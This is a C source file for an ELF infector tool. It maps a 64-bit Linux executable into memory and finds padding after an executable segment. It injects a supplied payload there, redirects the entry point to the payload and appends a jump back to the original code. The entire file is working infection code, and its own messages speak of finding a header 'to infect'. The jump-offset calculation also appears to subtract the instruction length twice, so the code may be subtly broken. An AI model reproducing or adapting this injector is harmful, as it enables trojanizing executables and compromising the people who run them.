#include "structs.h"


 /* ELF header
          mm          (char *)     :  memory map with mmap
          header      (Elf64_Ehdr) :  Elf header, contains info about binary
          pheader     (Elf64_Phdr) :  Array of programs
          prog_size   (size_t)     :  Payload size
 */

int read_elf(const char *mm, Elf64_Ehdr *header, Elf64_Phdr *pheader, size_t prog_size){
    if (verbose) fprintf(stderr, "\n>>>> Starting READ: <<<<\n\n");
    if (prog_size == 0) f_error("PAYLOAD", "Payload Size 0 Error");

    // Verifying authenticity & type of ELF file
    if (mm[EI_MAG0] != ELFMAG0 || mm[EI_MAG1] != ELFMAG1 ||
        mm[EI_MAG2] != ELFMAG2 || mm[EI_MAG3] != ELFMAG3)
        f_error("ELF FILE", "Binary is not an ELF file, failed ELF header validation");

    // verify 64 bit
    if (mm[EI_CLASS] != ELFCLASS64)
        f_error("ELF FILE", "Binary is not 64 bit, failed ELF header validation");
    else if (verbose)
        fprintf(stderr, "Target ELF file verified.\n");

    if (header->e_phoff == 0)
        f_error("ELF Header", "ELF file Header struct broken");
    else if (header->e_shoff == 0)
        f_error("ELF Header", "ELF Section Header struct broken");
    
    int phnum = header->e_phnum;
    if (verbose) {
        fprintf(stderr, "Program header entries:           %d\n", phnum);
        fprintf(stderr, "Program header entry byte size:   0x%x\n", (uint16_t) header->e_phentsize);
        fprintf(stderr, "Program header entry byte offset: 0x%x\n", (uint16_t) header->e_phoff);
    }

    int ph_num = -1;
    for (int i = 0; i < phnum; i++) {
        if (pheader[i].p_filesz == 0 || !(pheader[i].p_flags & PF_X) || pheader[i].p_filesz != pheader[i].p_memsz) continue;

        uint64_t segment_end = pheader[i].p_offset + pheader[i].p_filesz;

        if (verbose) {
            fprintf(stderr, "\nFOUND VALID PROGRAM HEADER TO INFECT, at %lu, p%d\n", segment_end, i+1);
            fprintf(stderr, "\tElf program header mem size:             0x%lx\n", pheader[i].p_memsz);
            fprintf(stderr, "\tElf program file size:                   0x%lx\n", pheader[i].p_filesz);
            fprintf(stderr, "\tElf program header byte offset:          0x%lx\n", pheader[i].p_offset);
            fprintf(stderr, "\tElf program header physical address:     0x%lx\n", pheader[i].p_paddr);
            fprintf(stderr, "\tElf program header byte virtual address: 0x%lx\n", pheader[i].p_vaddr);
        }

        uint64_t next_segment_start = UINT64_MAX;
        for (int j = 0; j < phnum; j++)
            if (pheader[j].p_offset > segment_end && pheader[j].p_filesz > 0 && pheader[j].p_offset < next_segment_start)
                next_segment_start = pheader[j].p_offset;
        
        uint64_t padding_end = next_segment_start - 1;
        uint64_t padding_size = padding_end - segment_end;
        
        if (prog_size + JMP_INSTRUCTION_SIZE > padding_size) 
            f_error("PAYLOAD", "Not enough padding, payload too large!");

        if (verbose) {
            fprintf(stderr, "\nInjection start: 0x%lx\n", segment_end);
            fprintf(stderr, "Injection end: 0x%lx\n", padding_end);
            fprintf(stderr, "Padding size: %lu bytes\n", padding_size);
            fprintf(stderr, "Payload size: %lu bytes\n", prog_size);
        }

        ph_num = i;
    }

    return ph_num;
}


void write_injection(char *target, Elf64_Ehdr *header, Elf64_Phdr *phdr, const char *payload_data, size_t payload_len, int ph_num) {
    if (verbose)
        fprintf(stderr, "\n>>>> Starting WRITE: <<<<\n\n");

    uint64_t inj_offset = phdr[ph_num].p_offset + phdr[ph_num].p_filesz;
    uint64_t inj_vaddr = phdr[ph_num].p_vaddr + phdr[ph_num].p_filesz;

    off_t jmp_offset = header->e_entry - (inj_vaddr + payload_len + JMP_INSTRUCTION_SIZE);

    if (jmp_offset > 0x7FFFFFFFL || jmp_offset < -0x80000000L)
        f_error("JMP", "Relative jmp instruction > 2gb, unable to perform jump");

    if (verbose) {
        fprintf(stderr, "Injection position:          0x%lx\n", inj_offset);
        fprintf(stderr, "Original entry point:        0x%lx\n", header->e_entry);
        fprintf(stderr, "New entry point position:    0x%lx\n", inj_vaddr);
        fprintf(stderr, "JUMP len back to original:   %ld\n", jmp_offset);
    }

    // Generating machine relative return 'jmp' insert
    char jump_back[5] = { 0xE9, 0x00, 0x00, 0x00, 0x00 };
    *(Elf64_Word*) (jump_back + 1) = (Elf64_Word) jmp_offset - 5;

    // setting entry point to the injection
    header->e_entry = inj_vaddr;
    
    // writing payload to target
    memcpy(target + inj_offset, payload_data, payload_len);
    memcpy(target + inj_offset + payload_len, jump_back, JMP_INSTRUCTION_SIZE);

    // increasing program header file sizes
    phdr[ph_num].p_filesz += payload_len + JMP_INSTRUCTION_SIZE;
    phdr[ph_num].p_memsz += payload_len + JMP_INSTRUCTION_SIZE;

    if (verbose)
        fprintf(stderr, "\nFinished injection. Exiting.\n\n");
}


int main(int argc, char **argv) {
    printf("ELF Injection Initiated\n\n");

		char *tar_path;
		char *pay_path;
		parse_args(argc, argv, &tar_path, &pay_path);

    char *target;
    size_t target_size;
    if (verbose) fprintf(stderr, "Opening target ELF, \"%s\"\n", tar_path);
    switch (file_memmap(&target, tar_path, &target_size, PROT_READ | PROT_WRITE)){
        case -1: f_error("TARGET ELF FILE", "Target ELF file failed to open");
        case -2: f_error("TARGET ELF FILE", "Target ELF stat failed to retrieve");
        case -3: f_error("TARGET ELF FILE", "Target ELF failed to mmap");
    }

    char *payload;
    size_t payload_size;
    if (verbose) fprintf(stderr, "Opening payload binary, \"%s\"\n", pay_path);
    switch (file_memmap(&payload, pay_path, &payload_size, PROT_READ)){
        case -1: f_error("PAYLOAD", "PAYLOAD failed to open");
        case -2: f_error("PAYLOAD", "PAYLOAD stat failed to retrieve");
        case -3: f_error("PAYLOAD", "PAYLOAD failed to mmap");
    }

    Elf64_Ehdr *header = (Elf64_Ehdr *) target;
    Elf64_Phdr *pheader = (Elf64_Phdr *) (target + header->e_phoff);

    // inject_head: Offset for payload to be injected
    int ph_num = read_elf(target, header, pheader, payload_size);
    if (ph_num < 0) f_error("ELF Reader", "Failed to find injection point!");

    write_injection(target, header, pheader, payload, payload_size, ph_num);

    msync(target, target_size, MS_SYNC);

    mmclean(target, target_size);
    mmclean(payload, payload_size);
    printf("ELF Injection Success!\n\n");
    return 0;
}
